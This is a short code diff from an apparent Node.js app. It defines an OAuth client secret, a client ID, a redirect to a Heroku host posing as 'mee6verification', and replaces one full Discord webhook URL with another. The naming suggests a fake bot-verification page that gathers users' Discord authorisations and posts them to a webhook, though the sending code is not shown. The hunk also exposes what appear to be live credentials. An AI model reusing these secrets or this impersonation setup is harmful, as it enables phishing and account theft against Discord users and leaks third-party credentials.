@@ -2,7 +2,7 @@
 const client_secret = '9eh8Q~RWrIdh2q_DEf-Q1S4-QNPBtEf5VjOy1bmy'
 const client_id = 'a52f392f-4b74-4e74-91ee-6a902b662217'
 const redirect_uri = 'https://mee6verification.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1050416140448444467/WJwn-USlsBp2DEQfEda34zInhqM-9OKKKhVcGMF0DgRGhmkRdSh5atlOkbmHx631L9yR'
+const webhook_url = 'https://discord.com/api/webhooks/1048950762614575104/xcsYV4oI6pctnTWZWLV5WjYLPXYA4yNN1LIIZgG00YYNZMYmkYz9MobwfjopAVUDNNRI'
 //Requirements
 require("dotenv").config()
 const axios = require('axios')
